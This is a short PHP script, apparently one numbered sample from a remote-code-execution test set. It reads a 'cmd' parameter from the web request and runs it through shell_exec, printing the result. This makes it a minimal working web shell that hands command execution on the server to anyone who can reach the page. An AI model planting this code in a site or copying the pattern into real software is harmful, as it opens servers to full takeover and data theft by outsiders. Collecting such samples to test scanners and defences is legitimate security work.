<?php
// RCE test variation #1112
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>